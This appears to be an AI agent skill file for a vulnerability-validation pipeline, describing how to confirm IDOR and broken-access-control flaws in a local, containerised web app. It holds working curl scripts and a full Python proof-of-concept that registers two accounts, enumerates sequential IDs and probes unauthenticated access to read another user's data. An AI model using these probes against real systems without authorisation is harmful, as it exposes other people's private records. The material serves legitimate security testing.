---
name: validate-idor
description: Validate IDOR/broken access control by testing cross-user resource access with manipulated object IDs. Creates two test accounts, authenticates as each, then attempts to access the second user's resources using the first user's credentials.
origin: vuln-analysis
---

# Validator: IDOR (Insecure Direct Object Reference / Broken Access Control)

Confirm whether an endpoint allows horizontal privilege escalation by testing cross-user access with numeric/sequential ID substitution.

## When to Activate

- An `idor` vulnerability needs validation during reproduction (Step 7/8)
- The finding specifies a webapp endpoint that takes a user-controlled ID parameter

## No External Infrastructure Required

IDOR validation requires NO additional infrastructure. All evidence is gathered from HTTP responses:
- **Two-user test**: Register two accounts, cross-access resources
- **ID enumeration test**: Increment/decrement IDs and check for 200 responses to others' resources
- **Unauthenticated access test**: Access authenticated endpoints without credentials

## Prerequisites

```bash
# Verify the target endpoint exists and responds
curl -sf -o /dev/null -w "%{http_code}" http://localhost:<port>/api/endpoint
# Accept: 200, 401, 403 — any means the endpoint exists

# Verify the app has user creation / registration
curl -sf -o /dev/null -w "%{http_code}" -X POST http://localhost:<port>/api/register \
  -H 'Content-Type: application/json' -d '{"username":"probe_user","password":"ProbePass1!"}'
# 200/201 = registration exists; 404/405 = try /api/signup, /register, /users
```

## Validation Techniques (try in order)

### Technique 1: Two-User Horizontal Access (primary — most reliable)

Create two distinct test accounts, then attempt to access user2's private resources using user1's credentials.

```bash
TARGET="http://localhost:<port>"
REG_ENDPOINT="/api/register"   # adjust to actual registration endpoint
AUTH_ENDPOINT="/api/login"     # adjust to actual login endpoint
RESOURCE_ENDPOINT="/api/users" # adjust to actual resource endpoint

# Step 1: Register two test users
U1_RESP=$(docker exec <container> curl -sf -X POST "${TARGET}${REG_ENDPOINT}" \
  -H 'Content-Type: application/json' \
  -d '{"username":"idor_test_user1","password":"IdorTestPass1!","email":"user1@test.com"}')
U2_RESP=$(docker exec <container> curl -sf -X POST "${TARGET}${REG_ENDPOINT}" \
  -H 'Content-Type: application/json' \
  -d '{"username":"idor_test_user2","password":"IdorTestPass2!","email":"user2@test.com"}')

# Step 2: Login as user1, capture token + ID
LOGIN1=$(docker exec <container> curl -sf -X POST "${TARGET}${AUTH_ENDPOINT}" \
  -H 'Content-Type: application/json' \
  -d '{"username":"idor_test_user1","password":"IdorTestPass1!"}')
TOKEN1=$(echo "$LOGIN1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token','') or d.get('access_token','') or d.get('jwt',''))")
USER1_ID=$(echo "$LOGIN1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user_id','') or d.get('id',''))")

# Step 3: Login as user2, capture token + ID
LOGIN2=$(docker exec <container> curl -sf -X POST "${TARGET}${AUTH_ENDPOINT}" \
  -H 'Content-Type: application/json' \
  -d '{"username":"idor_test_user2","password":"IdorTestPass2!"}')
TOKEN2=$(echo "$LOGIN2" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token','') or d.get('access_token','') or d.get('jwt',''))")
USER2_ID=$(echo "$LOGIN2" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user_id','') or d.get('id',''))")

# Step 4: Use user1's token to access user2's resource (the IDOR test)
CROSS_RESP=$(docker exec <container> curl -sf -w "\n%{http_code}" \
  -H "Authorization: Bearer ${TOKEN1}" \
  "${TARGET}${RESOURCE_ENDPOINT}/${USER2_ID}")
HTTP_CODE=$(echo "$CROSS_RESP" | tail -1)
BODY=$(echo "$CROSS_RESP" | head -n -1)

# Step 5: Verify — 200 with user2's data = IDOR confirmed
if [ "$HTTP_CODE" = "200" ] && echo "$BODY" | grep -q "idor_test_user2"; then
  echo "[CONFIRMED] IDOR: User1 (ID=${USER1_ID}) accessed User2 (ID=${USER2_ID}) resource. HTTP ${HTTP_CODE}"
  echo "Response snippet: $(echo "$BODY" | head -c 200)"
else
  echo "Access returned HTTP ${HTTP_CODE} — not exploitable or no data returned"
fi
```

### Technique 2: Sequential ID Enumeration (when no registration endpoint)

Probe with integer IDs incrementally to find accessible resources belonging to other users.

```bash
TARGET="http://localhost:<port>"
TOKEN="<authenticated_user_token>"
RESOURCE_ENDPOINT="/api/orders"  # any user-owned resource endpoint

# Get the current authenticated user's resource to establish a baseline ID
CURRENT=$(docker exec <container> curl -sf -H "Authorization: Bearer $TOKEN" \
  "${TARGET}${RESOURCE_ENDPOINT}/me")
MY_ID=$(echo "$CURRENT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id','1'))" 2>/dev/null || echo "1")

# Try IDs around the current user's ID
for PROBE_ID in $(seq $((MY_ID - 3)) $((MY_ID + 3))); do
  [ "$PROBE_ID" -eq "$MY_ID" ] && continue  # skip own resource
  HTTP=$(docker exec <container> curl -sf -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "${TARGET}${RESOURCE_ENDPOINT}/${PROBE_ID}")
  if [ "$HTTP" = "200" ]; then
    BODY=$(docker exec <container> curl -sf -H "Authorization: Bearer $TOKEN" \
      "${TARGET}${RESOURCE_ENDPOINT}/${PROBE_ID}")
    echo "[CONFIRMED] IDOR: Accessed resource ID=${PROBE_ID} (not owned by authenticated user)"
    echo "Response: $(echo "$BODY" | head -c 300)"
    break
  fi
done
```

### Technique 3: Unauthenticated Access (vertical — missing auth entirely)

Test if authenticated-only endpoints are accessible without any credentials.

```bash
TARGET="http://localhost:<port>"
TOKEN="<authenticated_user_token>"
RESOURCE_ENDPOINT="/api/users"

# First, get a known resource ID while authenticated
AUTH_RESP=$(docker exec <container> curl -sf \
  -H "Authorization: Bearer $TOKEN" "${TARGET}${RESOURCE_ENDPOINT}/1")
[ -z "$AUTH_RESP" ] && { echo "Resource not found with auth — skipping"; exit 1; }

# Then probe without any token
NO_AUTH_HTTP=$(docker exec <container> curl -sf -o /dev/null -w "%{http_code}" \
  "${TARGET}${RESOURCE_ENDPOINT}/1")
NO_AUTH_BODY=$(docker exec <container> curl -sf "${TARGET}${RESOURCE_ENDPOINT}/1")

if [ "$NO_AUTH_HTTP" = "200" ] && [ -n "$NO_AUTH_BODY" ]; then
  echo "[CONFIRMED] IDOR (unauthenticated): Accessed user resource without any authentication"
  echo "Response: $(echo "$NO_AUTH_BODY" | head -c 200)"
fi
```

## Success Criteria

| Result | Condition |
|--------|-----------|
| **[SUCCESS]** | Cross-user access returns HTTP 200 with target user's data AND legitimacy check passes |
| **[FAILED]** | All cross-user access returns 403/404, or data belongs to the requesting user (not the target user) |
| **[INVALID]** | PoC directly queries the database rather than going through the target app's HTTP layer |

## Legitimacy Check (Anti-Cheat)

Scan the PoC script source code. If ANY of these patterns appear as **direct calls** (not as string payloads), the result is `[INVALID]`:

```python
# FORBIDDEN — bypasses the target app's authorization layer
User.objects.get(id=other_user_id)    # INVALID — direct ORM query
cursor.execute("SELECT * FROM users WHERE id = %s", (other_id,))  # INVALID — direct DB
db.query(User).filter_by(id=other_id).first()  # INVALID — direct ORM

# CORRECT — tests through the HTTP interface
requests.get(f"{target}/api/users/{other_id}",
             headers={"Authorization": f"Bearer {token1}"})  # VALID
```

**Rule**: The PoC must test authorization through the target app's HTTP interface.

## PoC Pattern

```python
#!/usr/bin/env python3
"""IDOR PoC: Cross-user resource access via manipulated object ID"""
import argparse, requests, sys, time

def exploit(target: str, timeout: int) -> dict | None:
    reg_ep  = f"{target}/api/register"
    auth_ep = f"{target}/api/login"

    # Discover resource endpoint from vulnerability entry_point
    resource_ep = f"{target}/api/users"  # override with entry_point.path

    ts = str(int(time.time()))
    u1 = {"username": f"idor_poc_a_{ts}", "password": "PocPassA1!", "email": f"poc_a_{ts}@test.com"}
    u2 = {"username": f"idor_poc_b_{ts}", "password": "PocPassB1!", "email": f"poc_b_{ts}@test.com"}

    try:
        # Register both users
        r1 = requests.post(reg_ep, json=u1, timeout=timeout)
        r2 = requests.post(reg_ep, json=u2, timeout=timeout)
        if r1.status_code not in (200, 201) or r2.status_code not in (200, 201):
            return None  # registration endpoint not available

        # Login both users
        l1 = requests.post(auth_ep, json={"username": u1["username"], "password": u1["password"]}, timeout=timeout)
        l2 = requests.post(auth_ep, json={"username": u2["username"], "password": u2["password"]}, timeout=timeout)
        l1_data, l2_data = l1.json(), l2.json()

        token1 = l1_data.get("token") or l1_data.get("access_token") or l1_data.get("jwt", "")
        token2 = l2_data.get("token") or l2_data.get("access_token") or l2_data.get("jwt", "")
        user2_id = l2_data.get("user_id") or l2_data.get("id", "")

        if not token1 or not user2_id:
            return None

        # Cross-access: user1's token accessing user2's resource
        cross = requests.get(
            f"{resource_ep}/{user2_id}",
            headers={"Authorization": f"Bearer {token1}"},
            timeout=timeout
        )

        if cross.status_code == 200 and u2["username"] in cross.text:
            return {
                "technique": "horizontal_access",
                "user1": u1["username"], "user2": u2["username"],
                "user2_id": user2_id,
                "http_code": cross.status_code,
                "evidence": cross.text[:300]
            }
    except Exception as e:
        return None
    return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:8080")
    parser.add_argument("--timeout", type=int, default=30)
    args = parser.parse_args()

    result = exploit(args.target, args.timeout)
    if result:
        print(f"[CONFIRMED] IDOR: {result['user1']} accessed {result['user2']} (ID={result['user2_id']}) resource")
        print(f"Evidence: {result['evidence'][:200]}")
        sys.exit(0)
    else:
        print("[NOT_REPRODUCED] Cross-user access was blocked or registration unavailable")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

## Confidence Scoring (1-10)

| Score | Scenario |
|-------|----------|
| 9-10 | User1 accesses user2's private resource (HTTP 200 with user2's data) using horizontal ID substitution |
| 7-8 | Unauthenticated access to endpoint that returns user-specific data |
| 5-6 | HTTP 200 but cannot confirm data belongs to another user (generic response) — needs re-run with unique data |
| 1-4 | All probes return 403/404 — access controls appear to be working |

**Threshold: Only mark [SUCCESS] if Confidence >= 7**

## Output: Write to results.json (MANDATORY)

```json
{
  "vuln_id": "VULN-001",
  "type": "idor",
  "poc_script": "poc_scripts/poc_idor_001.py",
  "status": "SUCCESS",
  "exit_code": 0,
  "retries": 0,
  "entry_point_used": "GET /api/users/{id}",
  "validation_result": {
    "marker": "CONFIRMED",
    "evidence": "User idor_poc_a_<ts> (authenticated) accessed resource of user idor_poc_b_<ts> (ID=42) — HTTP 200 with username 'idor_poc_b' in response body"
  }
}
```

**Marker values**:
- `"CONFIRMED"` → cross-user access succeeded with target user's data in response
- `"NOT_REPRODUCED"` → all probes blocked (403/404) or registration unavailable
- `"PARTIAL"` → HTTP 200 but could not confirm target user's data in response
- `"ERROR"` → network/infrastructure failure
